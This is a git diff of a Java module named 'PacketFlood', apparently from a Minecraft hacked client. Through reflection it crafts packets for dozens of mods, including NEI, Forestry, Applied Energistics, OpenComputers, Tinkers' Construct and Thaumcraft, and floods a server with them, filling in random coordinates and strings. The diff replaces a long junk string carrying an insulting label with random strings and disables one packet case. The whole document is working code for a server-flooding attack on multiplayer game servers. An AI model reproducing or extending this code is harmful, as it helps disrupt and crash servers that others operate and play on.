@@ -137,7 +137,7 @@ public class PacketFlood extends Module {
     }
 
     public void sendRandomPacket() {
-        String NMSL = "NMSL-wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+        //String NMSL = "NMSL-wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
         if (validPackets.isEmpty()) {
             return;
         }
@@ -152,7 +152,7 @@ public class PacketFlood extends Module {
                     case NEI_SpawnerID:
                         Object SpawnerID_constructor = packetClass.getDeclaredConstructor(Object.class, int.class).newInstance("NEI", 15);
                         SpawnerID_constructor.getClass().getDeclaredMethod("writeCoord", int.class, int.class, int.class).invoke(SpawnerID_constructor, rand.x(), rand.y(), rand.z());
-                        SpawnerID_constructor.getClass().getDeclaredMethod("writeString", String.class).invoke(NMSL);
+                        SpawnerID_constructor.getClass().getDeclaredMethod("writeString", String.class).invoke(rand.str());
                         SpawnerID_constructor.getClass().getDeclaredMethod("sendToServer").invoke(SpawnerID_constructor);
                         break;
                     case CRAYFISH_MessageTVServer:
@@ -172,13 +172,13 @@ public class PacketFlood extends Module {
                         Class.forName("forestry.core.proxy.ProxyNetwork").getDeclaredMethod("sendToServer", Class.forName("forestry.core.network.IForestryPacketServer")).invoke(Class.forName("forestry.core.proxy.Proxies").getDeclaredField("net").get(null), packetClass.getDeclaredConstructor(TileEntity.class, int.class).newInstance(rand.tile(), Rand.num()));
                         break;
                     case FORESTRY_PacketLetterTextSet:
-                        Class.forName("forestry.core.proxy.ProxyNetwork").getDeclaredMethod("sendToServer", Class.forName("forestry.core.network.IForestryPacketServer")).invoke(Class.forName("forestry.core.proxy.Proxies").getDeclaredField("net").get(null), packetClass.getDeclaredConstructor(String.class).newInstance(NMSL));
+                        Class.forName("forestry.core.proxy.ProxyNetwork").getDeclaredMethod("sendToServer", Class.forName("forestry.core.network.IForestryPacketServer")).invoke(Class.forName("forestry.core.proxy.Proxies").getDeclaredField("net").get(null), packetClass.getDeclaredConstructor(String.class).newInstance(rand.str()));
                         break;
                     case ADVSOLAR_PacketGUIPressButton:
                         Class.forName("advsolar.network.ASPPacketHandler").getDeclaredMethod("sendToServer", Class.forName("advsolar.network.IPacket")).invoke(null, packetClass.getDeclaredConstructor().newInstance());
                         break;
                     case AE2_PacketValueConfig:
-                        Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredMethod("sendToServer", Class.forName("appeng.core.sync.AppEngPacket")).invoke(Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredField("instance").get(null), packetClass.getDeclaredConstructor(String.class, String.class).newInstance(NMSL, Rand.str()));
+                        Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredMethod("sendToServer", Class.forName("appeng.core.sync.AppEngPacket")).invoke(Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredField("instance").get(null), packetClass.getDeclaredConstructor(String.class, String.class).newInstance(rand.str(), Rand.str()));
                         break;
                     case AE2_PacketPartialItem:
                         Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredMethod("sendToServer", Class.forName("appeng.core.sync.AppEngPacket")).invoke(Class.forName("appeng.core.sync.network.NetworkHandler").getDeclaredField("instance").get(null), packetClass.getDeclaredConstructor(int.class, int.class, byte[].class).newInstance(Rand.num(), Rand.num(), new byte[0]));
@@ -224,7 +224,7 @@ public class PacketFlood extends Module {
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("shedar.mods.ic2.nuclearcontrol.network.ChannelHandler").getDeclaredField("network").get(null), packetClass.getDeclaredConstructor(ItemStack.class).newInstance(rand.item()));
                         break;
                     case IC2NC_PacketClientSound:
-                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("shedar.mods.ic2.nuclearcontrol.network.ChannelHandler").getDeclaredField("network").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, byte.class, String.class).newInstance(rand.x(), rand.y(), rand.z(), (byte) 0, NMSL));
+                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("shedar.mods.ic2.nuclearcontrol.network.ChannelHandler").getDeclaredField("network").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, byte.class, String.class).newInstance(rand.x(), rand.y(), rand.z(), (byte) 0, Rand.str()));
                         break;
                     case IC2NC_PacketClientRequest:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("shedar.mods.ic2.nuclearcontrol.network.ChannelHandler").getDeclaredField("network").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class).newInstance(rand.x(), rand.y(), rand.z()));
@@ -248,10 +248,10 @@ public class PacketFlood extends Module {
                         Class.forName("openmods.network.event.NetworkEvent").getDeclaredMethod("sendToServer").invoke(Class.forName("openblocks.events.ElevatorActionEvent").getDeclaredConstructor(int.class, int.class, int.class, int.class, packetClass).newInstance(0, rand.x(), 0, rand.z(), packetClass.getDeclaredField("JUMP").get(null)));
                         break;
                     case OC_SendClipboard:
-                        packetClass.getDeclaredMethod("sendClipboard", String.class, String.class).invoke(null, NMSL, Rand.str());
+                        packetClass.getDeclaredMethod("sendClipboard", String.class, String.class).invoke(null, Rand.str(), Rand.str());
                         break;
                     case OC_SendCopyToAnalyzer:
-                        packetClass.getDeclaredMethod("sendCopyToAnalyzer", String.class, int.class).invoke(null, NMSL, Rand.num());
+                        packetClass.getDeclaredMethod("sendCopyToAnalyzer", String.class, int.class).invoke(null, Rand.str(), Rand.num());
                         break;
                     case OC_SendRobotStateRequest:
                         packetClass.getDeclaredMethod("sendRobotStateRequest", int.class, int.class, int.class, int.class).invoke(null, 0, rand.x(), rand.y(), rand.z());
@@ -263,16 +263,16 @@ public class PacketFlood extends Module {
                         Class.forName("tconstruct.util.network.PacketPipeline").getDeclaredMethod("sendToServer", Class.forName("mantle.common.network.AbstractPacket")).invoke(Class.forName("tconstruct.TConstruct").getDeclaredField("packetPipeline").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, int.class, boolean.class, int.class).newInstance(0, rand.x(), rand.y(), rand.z(), Rand.bool(), 0));
                         break;
                     case TINKER_ToolStationPacket:
-                        Class.forName("tconstruct.util.network.PacketPipeline").getDeclaredMethod("sendToServer", Class.forName("mantle.common.network.AbstractPacket")).invoke(Class.forName("tconstruct.TConstruct").getDeclaredField("packetPipeline").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, String.class).newInstance(rand.x(), rand.y(), rand.z(), NMSL));
+                        Class.forName("tconstruct.util.network.PacketPipeline").getDeclaredMethod("sendToServer", Class.forName("mantle.common.network.AbstractPacket")).invoke(Class.forName("tconstruct.TConstruct").getDeclaredField("packetPipeline").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, String.class).newInstance(rand.x(), rand.y(), rand.z(), Rand.str()));
                         break;
                     case THERMAL_TeleportChannelRegistry:
-                        packetClass.getDeclaredMethod("requestChannelList", String.class).invoke(null, NMSL);
+                        packetClass.getDeclaredMethod("requestChannelList", String.class).invoke(null, Rand.str());
                         break;
                     case THERMAL_SendLexiconStudyPacketToServer:
                         packetClass.getDeclaredMethod("sendLexiconStudyPacketToServer", int.class).invoke(null, Rand.num());
                         break;
                     case THERMAL_SendLexiconStudySelectPacketToServer:
-                        packetClass.getDeclaredMethod("sendLexiconStudySelectPacketToServer", int.class, String.class).invoke(null, Rand.num(), NMSL);
+                        packetClass.getDeclaredMethod("sendLexiconStudySelectPacketToServer", int.class, String.class).invoke(null, Rand.num(), Rand.str());
                         break;
                     case WRADDON_SendOpenSniffer:
                         packetClass.getDeclaredMethod("sendOpenSniffer").invoke(null);
@@ -304,9 +304,9 @@ public class PacketFlood extends Module {
                     case THAUMCRAFT_Note:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, int.class).newInstance(rand.x(), rand.y(), rand.z(), 0));
                         break;
-                    case THAUMCRAFT_FocusChange:
-                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(mc.thePlayer, NMSL));
-                        break;
+                    //case THAUMCRAFT_FocusChange:
+                    //                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(mc.thePlayer, Rand.str()));
+                    //                        break;
                     case THAUMCRAFT_ItemKey:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, int.class).newInstance(mc.thePlayer, Rand.num()));
                         break;
